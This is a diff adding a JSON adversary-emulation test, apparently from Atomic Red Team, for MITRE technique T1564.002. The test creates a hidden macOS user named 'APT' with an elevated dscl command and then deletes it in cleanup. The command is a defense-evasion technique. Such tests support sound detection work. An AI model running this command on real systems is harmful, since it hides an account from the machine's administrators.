@@ -1,0 +1,31 @@
+{
+    "name": "Create Hidden User using IsHidden option",
+    "description": "Add a hidden user on macOS using IsHidden optoin ",
+    "supported_platforms": [
+        "macos"
+    ],
+    "executor": {
+        "command": "sudo dscl . -create /Users/#{user_name} IsHidden 1\n",
+        "cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n",
+        "elevation_required": true,
+        "name": "sh",
+        "type": "Command Executor"
+    },
+    "id": "T1564.002",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Hidden Users",
+    "source": "ART",
+    "uuid": "de87ed7b-52c3-43fd-9554-730f695e7f31",
+    "arguments": {
+        "user_name": {
+            "description": "username to add",
+            "type": "string",
+            "default": "APT"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
